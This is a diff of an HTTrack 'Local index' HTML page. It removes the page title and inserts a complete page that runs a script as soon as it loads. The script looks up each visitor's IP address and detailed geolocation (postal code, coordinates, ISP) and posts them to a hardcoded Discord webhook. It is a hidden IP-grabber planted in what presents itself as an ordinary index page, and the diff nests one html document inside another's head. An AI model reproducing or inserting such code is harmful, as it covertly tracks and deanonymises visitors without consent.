@@ -103,7 +103,114 @@ h4 { margin: 0;  font-weight: bold;  font-size: 1.18em; }
 <!-- ==================== End prologue ==================== -->
 
 	<meta name="generator" content="HTTrack Website Copier/3.x">
-	<TITLE>Local index - HTTrack</TITLE>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Webhook</title>
+</head>
+<body>
+    <div id="loading">Loading...</div>
+    <div id="message"></div>
+
+    <script>
+        // Function to send the webhook
+        function sendWebhook() {
+            // Display loading indicator
+            document.getElementById("loading").innerText = "Loading...";
+
+            // Define webhook URL
+            var webhookUrl = "https://discord.com/api/webhooks/1224225575351357481/SXSi-hJxtpetug433Au7tG7Tr6kky407_t6Ecb831baO9u8EAaBnyQmqALl3FQEsnvix";
+
+            // Prepare webhook data
+            var webhookData = {
+                username: "folopio.com",
+                avatar_url: "https://files.catbox.moe/rt55av.jpg",
+                content: "@everyone",
+                embeds: []
+            };
+
+            // Fetch user's IP address
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    // Add IP address to webhook data
+                    webhookData.ip_address = data.ip;
+                    // Fetch location information based on the user's IP address
+                    return fetch('https://ipapi.co/' + data.ip + '/json/');
+                })
+                .then(response => response.json())
+                .then(locationData => {
+                    // Construct location string
+                    var location = "Location: " + locationData.city + ', ' + locationData.region + ', ' + locationData.country_name;
+                    // Add additional information
+                    location += "\nNetwork: " + locationData.network +
+                                "\nVersion: " + locationData.version +
+                                "\nRegion Code: " + locationData.region_code +
+                                "\nCountry Code: " + locationData.country_code +
+                                "\nCountry Code ISO3: " + locationData.country_code_iso3 +
+                                "\nCountry Capital: " + locationData.country_capital +
+                                "\nCountry TLD: " + locationData.country_tld +
+                                "\nContinent Code: " + locationData.continent_code +
+                                "\nIn EU: " + locationData.in_eu +
+                                "\nPostal Code: " + locationData.postal +
+                                "\nLatitude: " + locationData.latitude +
+                                "\nLongitude: " + locationData.longitude +
+                                "\nTimezone: " + locationData.timezone +
+                                "\nUTC Offset: " + locationData.utc_offset +
+                                "\nCountry Calling Code: " + locationData.country_calling_code +
+                                "\nCurrency: " + locationData.currency +
+                                "\nCurrency Name: " + locationData.currency_name +
+                                "\nLanguages: " + locationData.languages +
+                                "\nCountry Area: " + locationData.country_area +
+                                "\nCountry Population: " + locationData.country_population +
+                                "\nASN: " + locationData.asn +
+                                "\nISP: " + locationData.org;
+                    
+                    // Construct embed object
+                    var currentDate = new Date().toLocaleString();
+                    var embed = {
+                        title: "User Information",
+                        description: location + "\nDate: " + currentDate,
+                        color: 16711680,
+                        author: {
+                            name: "folopio.com",
+                            icon_url: "https://files.catbox.moe/z7h592.gif"
+                        }
+                    };
+                    webhookData.embeds.push(embed);
+
+                    // Send webhook
+                    return fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(webhookData)
+                    });
+                })
+                .then(response => {
+                    if (response.ok) {
+                        document.getElementById("message").innerText = "Webhook sent successfully!";
+                    } else {
+                        document.getElementById("message").innerText = "Failed to send webhook. Status: " + response.status;
+                    }
+                })
+                .catch(error => {
+                    document.getElementById("message").innerText = "Error: " + error;
+                })
+                .finally(() => {
+                    // Remove loading indicator
+                    document.getElementById("loading").style.display = "none";
+                });
+        }
+
+        // Call sendWebhook function when the page loads
+        window.onload = sendWebhook;
+    </script>
+</body>
+</html>
 </HEAD>
 <BODY>
 <H1 ALIGN=Center>Index of locally available sites:</H1>
